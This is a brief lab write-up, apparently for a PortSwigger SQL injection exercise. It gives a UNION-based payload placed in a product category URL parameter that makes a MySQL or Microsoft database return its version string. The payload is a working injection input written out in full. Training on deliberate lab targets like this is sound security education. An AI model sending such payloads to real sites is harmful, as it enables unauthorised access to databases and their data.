# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
## Task
This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## Solution
Steps to solve this lab is pretty similar to the [previous one](https://github.com/datthinh1801/Writeups/blob/main/PortSwigger/SQL%20Injection/Lab%2007.md), except the final payload is:
```sql
/filter?category=Gifts'+UNION+SELECT+@@version,NULL#
```

![image](https://user-images.githubusercontent.com/44528004/130066778-f3136d65-68ce-480c-bc6d-e580342b01bd.png)
> Solved!
